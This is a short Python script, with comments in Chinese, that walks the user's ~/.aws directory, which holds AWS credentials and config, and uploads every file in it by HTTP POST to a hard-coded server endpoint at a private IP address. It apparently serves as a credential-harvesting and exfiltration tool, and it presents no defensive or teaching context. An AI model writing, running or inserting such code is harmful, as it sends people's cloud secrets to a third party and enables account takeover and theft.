#!/usr/bin/env python3
import configparser

import requests
import os
import tarfile

url = "http://192.168.3.146:48080/app-api/uctools/file/upload"  # 服务器地址
home = os.path.expanduser('~').replace('\\', '/')
aws = home + "/.aws"
image = home + "/image"
current_working_directory = os.getcwd()
print("当前工作目录：", current_working_directory)


def is_directory_empty(directory):
    return not os.listdir(directory)


def upload_file(path, upload_type):
    # 遍历目标目录所有文件以及目录
    for root_dir, branch_dir, root_file_names in os.walk(path):

        for file_name in root_file_names:
            file_path = os.path.join(root_dir, file_name).replace('\\', '/')
            # 元组列表形式
            if is_directory_empty(root_dir):
                print("文件夹: ", root_dir, "为空")

            else:
                files = [('file', open(file_path, 'rb'))]
                print("文件夹: ", root_dir, "不为空")
                print(file_path)
                print(root_dir.replace('\\', '/'))
                data = {'type': upload_type, 'path': root_dir.replace('\\', '/')}  # 类型aws = 1
                response = requests.post(url, files=files, data=data)
                print(response.text)


def execute():
    if os.path.exists(aws) and os.path.isdir(aws):
        upload_file(aws, 1)
    else:
        print("文件夹不存在")
